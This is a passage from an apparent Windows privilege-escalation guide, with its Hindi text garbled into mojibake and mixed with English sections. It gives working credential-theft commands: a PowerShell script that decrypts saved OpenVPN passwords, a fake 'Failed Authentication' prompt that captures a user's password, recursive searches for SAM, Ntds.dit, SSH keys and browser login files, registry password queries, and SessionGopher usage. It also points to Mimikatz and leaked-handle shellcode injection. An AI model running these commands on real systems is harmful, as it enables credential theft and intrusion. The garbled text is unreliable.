1. **рд╕рд░реНрд╡рд░ рдХрдиреЗрдХреНрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**: рд╕рд░реНрд╡рд░ рдХрдиреЗрдХреНрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╕рд░реНрд╡рд░ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
2. **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**: рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╡реЗ рд╕рд╣реА рд╣реИрдВред
3. **рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**: рдЕрдкрдиреЗ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ OpenVPN рдХрдиреЗрдХреНрд╢рди рдХреЛ рдмреНрд▓реЙрдХ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред
4. **рд╕рд░реНрд╡рд░ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**: рд╕рд░реНрд╡рд░ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рд╕рдорд╕реНрдпрд╛ рдХрд╛ рдХрд╛рд░рдг рдЦреЛрдЬреЗрдВред
5. **рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ**: OpenVPN рдХреЛ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ, рдпрд╣ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЛ рд╣рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдкрдХреА рд╕рдорд╕реНрдпрд╛ рдЕрднреА рднреА рд╣рд▓ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдЕрдкрдиреЗ OpenVPN рд╕рд░реНрд╡рд░ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### рд▓реЙрдЧ

Logs are records of events or actions that have occurred on a system. They can provide valuable information for troubleshooting, monitoring, and security purposes. In the context of local privilege escalation on Windows systems, logs can be a useful resource for identifying potential vulnerabilities and attack vectors.

Windows systems generate various types of logs, including event logs, security logs, and application logs. These logs can contain information about user activities, system events, network connections, and more. By analyzing these logs, you can gain insights into the system's behavior and identify any suspicious or unauthorized activities.

To access and analyze logs on a Windows system, you can use tools such as Event Viewer, PowerShell, or third-party log management solutions. It is important to regularly review and monitor logs to detect any signs of unauthorized access or privilege escalation attempts.

In the context of local privilege escalation, logs can help in identifying any unusual or unexpected activities that may indicate an ongoing attack. For example, you can look for log entries related to the creation or modification of user accounts, changes to system configurations, or failed login attempts. By analyzing these logs, you can identify potential security weaknesses and take appropriate measures to mitigate them.

In summary, logs play a crucial role in local privilege escalation on Windows systems. By regularly reviewing and analyzing logs, you can detect and respond to potential security threats in a timely manner.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem тАУPath C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рдкреВрдЫреЗрдВ

рдЖрдк рд╣рдореЗрд╢рд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЙрдирдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдпрд╛ рдПрдХ рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреВрдЫ рд╕рдХрддреЗ рд╣реИрдВ** рдЕрдЧрд░ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЙрд╕реЗ рдЙрдирдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрддрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХреЗ рд▓рд┐рдП рдЧреНрд░рд╛рд╣рдХ рд╕реЗ **рдкреВрдЫрдирд╛** рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **рдЬреЛрдЦрд┐рдордкреВрд░реНрдг** рд╣реЛрддрд╛ рд╣реИ):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **рдкрд╛рд╕рд╡рд░реНрдб рд╕рдореЗрдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕рдореНрдмрдиреНрдзреА рд╕рдВрднрд╛рд╡рд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдирд╛рдо**

рдЬреНрдЮрд╛рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬрд┐рдирдореЗрдВ рдХреБрдЫ рд╕рдордп рдкрд╣рд▓реЗ **рдкрд╛рд╕рд╡рд░реНрдб** рд╕рд╛рдл-рд╕рд╛рдл рдпрд╛ **Base64** рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдереЗ
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
рдЙрдкрд╕реНрдерд┐рдд рд╕рднреА рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem тАУPath C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### рд░реАрд╕рд╛рдЗрдХрд▓ рдмрд┐рди рдореЗрдВ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

рдЖрдкрдХреЛ рдмрд┐рди рдореЗрдВ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рджреЗрдЦрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдХрдИ рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рд╣реЗрдЬреЗ рдЧрдП **рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЗ рдЕрдВрджрд░

**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд╕рд╛рде рдЕрдиреНрдп рд╕рдВрднрд╛рд╡рд┐рдд рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗ openssh рдХреБрдВрдЬреА рдирд┐рдХрд╛рд▓реЗрдВред**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрддрд┐рд╣рд╛рд╕

рдЖрдкрдХреЛ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ **Chrome рдпрд╛ Firefox** рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред\
рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдХреЗ рдЗрддрд┐рд╣рд╛рд╕, рдмреБрдХрдорд╛рд░реНрдХ рдФрд░ рдкрд╕рдВрджреАрджрд╛ рднреА рджреЗрдЦреЗрдВ, рдЗрд╕рд▓рд┐рдП рдХреБрдЫ **рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)\*\*\*\*

### **COM DLL Overwriting**

**Component Object Model (COM)** рдПрдХ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рд╣реИ рдЬреЛ Windows рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рднреАрддрд░ рдмрдиреА рд╣реБрдИ рд╣реИ рдФрд░ рдЗрд╕рдХреА рдорджрдж рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдШрдЯрдХреЛрдВ рдХреЗ рдмреАрдЪ **рдЕрдВрддрд░рд╕рдВрдЪрд╛рд░** рд╕рдВрднрд╡ рд╣реЛрддреА рд╣реИред рдкреНрд░рддреНрдпреЗрдХ COM рдШрдЯрдХ рдХреЛ **рдПрдХ рдХрдХреНрд╖рд╛ рдЖрдИрдбреА (CLSID)** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдШрдЯрдХ рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рднрд┐рдиреНрдирддрд╛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдЖрдИрдбреА (IIDs) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

COM рдХрдХреНрд╖рд╛рдПрдВ рдФрд░ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** рдФрд░ **HKEY\_**_**CLASSES\_**_**ROOT\Interface** рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред рдпрд╣ рд░рдЬрд┐рд╕реНрдЯреНрд░реА **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** рдХреЛ рдорд┐рд▓рд╛рдХрд░ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ = **HKEY\_**_**CLASSES\_**_**ROOT**ред

рдЗрд╕ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЗ CLSIDs рдХреЗ рдЕрдВрджрд░ рдЖрдкрдХреЛ рдПрдХ рдмрд╛рд▓ рд░рдЬрд┐рд╕реНрдЯреНрд░реА **InProcServer32** рдорд┐рд▓реЗрдЧреА рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдПрдХ **DLL** рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рдорд╛рди рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **ThreadingModel** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрд╣ **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) рдпрд╛ **Neutral** (Thread Neutral) рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (638).png>)

рдореВрд▓ рд░реВрдк рд╕реЗ, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рднреА DLL рдХреЛ **рдЕрдзрд┐рд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдХрд┐рд╕реА рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛рдПрдЧреА, рддреЛ рдЖрдк рдпрджрд┐ рд╡рд╣ DLL рдПрдХ рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд░рд╣реА рд╣реИ рддреЛ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдПрдХ рдЯрд┐рдкреНрдкрдгреА рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдЖрдк рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреИрд╕реЗ COM Hijacking рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдерд╛рдпрд┐рддреНрд╡ рдореЗрдВ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рджреЗрдЦреЗрдВ:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рдЬреАрдиреЗрд░рд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб рдЦреЛрдЬреЗрдВ**

**рдлрд╝рд╛рдЗрд▓ рд╕рд╛рдордЧреНрд░реА рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**рдХрд┐рд╕реА рдирд┐рд╢реНрдЪрд┐рдд рдлрд╝рд╛рдЗрд▓ рдирд╛рдо рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдЦреЛрдЬреЗрдВ**

To search for a file with a certain filename, you can use the following command:

```bash
dir /s /b C:\filename.txt
```

This command will search for the file named `filename.txt` in the `C:\` directory and its subdirectories. The `/s` flag ensures that the search is performed recursively, and the `/b` flag displays only the file path without any additional information.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рдХреБрдВрдЬреА рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЦреЛрдЬреЗрдВ**

рдЖрдк рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рдХреБрдВрдЬреА рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### рдкрд╛рд╕рд╡рд░реНрдб рдЦреЛрдЬрдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдХрд░рдг

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **рдПрдХ msf** рдкреНрд▓рдЧрдЗрди рд╣реИ рдЬрд┐рд╕реЗ рдореИрдВрдиреЗ рдмрдирд╛рдпрд╛ рд╣реИ, рдЗрд╕ рдкреНрд▓рдЧрдЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдкрдХреЛ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЗ рднреАрддрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЦреЛрдЬрдиреЗ рд╡рд╛рд▓реЗ рд╣рд░ metasploit POST рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдорд┐рд▓рддреА рд╣реИред\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рдкрд╛рд╕рд╡рд░реНрдб рд╡рд╛рд▓реЗ рд╕рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрдЬрддрд╛ рд╣реИред\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) рдПрдХ рдФрд░ рд╢рд╛рдирджрд╛рд░ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИред

рдЙрдкрдХрд░рдг [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **рд╕рддреНрд░**, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдФрд░ **рдкрд╛рд╕рд╡рд░реНрдб** рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрдИ рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рд╕рд╛рдл рдЯреЗрдХреНрд╕реНрдЯ рдореЗрдВ рдЗрд╕ рдбреЗрдЯрд╛ рдХреЛ рд╕рд╣реЗрдЬрддреЗ рд╣реИрдВ (PuTTY, WinSCP, FileZilla, SuperPuTTY, рдФрд░ RDP)ред
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## рд▓реАрдХ рд╣реИрдВрдбрд▓рд░реНрд╕

рд╕реЛрдЪрд┐рдП рдХрд┐ **рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдиреЗ рдкреВрд░реА рдкрд╣реБрдВрдЪ рдХреЗ рд╕рд╛рде рдПрдХ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЦреЛрд▓реА** (`OpenProcess()`)ред рд╡рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рдПрдХ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рддреА рд╣реИ** (`CreateProcess()`) **рдХрдо рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде, рд▓реЗрдХрд┐рди рдореБрдЦреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рднреА рдЦреБрд▓реЗ рд╣реИрдВрдбрд▓реНрд╕ рдХреЛ рдЕрдиреБрдЧреНрд░рд╣рд┐рдд рдХрд░рддреА рд╣реИ**ред\
рдлрд┐рд░, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрдо рдЕрдзрд┐рдХрд╛рд░реЛрдВ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкреВрд░реА рдкрд╣реБрдВрдЪ рд╣реИ**, рддреЛ рдЖрдк **OpenProcess()** рдХреЗ рд╕рд╛рде рдмрдирд╛рдИ рдЧрдИ **рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░рд┐рдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЦреБрд▓реЗ рд╣реИрдВрдбрд▓ рдХреЛ рдкрдХрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдПрдХ рд╢реИрд▓рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЛ рдкрдврд╝реЗрдВ рдФрд░ рдЗрд╕ рд╕рдВрдХрдЯ рдХреЛ рдХреИрд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдФрд░ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░реЗрдВ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдПред](leaked-handle-exploitation.md)\
[**рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╕рдордЭ рдХреЗ рд▓рд┐рдП рдЗрд╕ рджреВрд╕рд░реЗ рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ, рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реНрддрд░реЛрдВ рдХреЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓реЗ рд╣реБрдП рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдФрд░ рдзрд╛рдЧреЛрдВ рдХреЗ рдЕрдзрд┐рдХ рдЦреБрд▓реЗ рд╣реИрдВрдбрд▓реНрд╕ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдФрд░ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдФрд░ рдкреЛрд╕реНрдЯ](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) рд╣реИред

## рдиреЗрдореНрдб рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдЕрдиреБрдХрд░рдг

`рдкрд╛рдЗрдк` рдПрдХ рд╕рд╛рдЭрд╛ рдореЗрдореЛрд░реА рдмреНрд▓реЙрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕рдВрдЪрд╛рд░ рдФрд░ рдбреЗрдЯрд╛ рд╡рд┐рдирд┐рдордп рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреА рд╣реИрдВред

